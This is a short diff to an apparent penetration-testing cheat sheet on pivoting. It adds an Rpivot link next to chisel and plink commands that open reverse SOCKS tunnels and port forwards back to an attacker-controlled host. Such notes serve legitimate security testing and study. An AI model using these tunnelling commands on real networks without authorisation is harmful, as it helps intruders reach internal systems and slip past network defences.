@@ -53,6 +53,9 @@ sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
 ./chisel.exe client <ATTACKER IP>:443 R:socks
 ```
 
+#### Rpivot
+- https://github.com/klsecservices/rpivot
+
 #### Port forwarding plink.exe
 ```
 plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
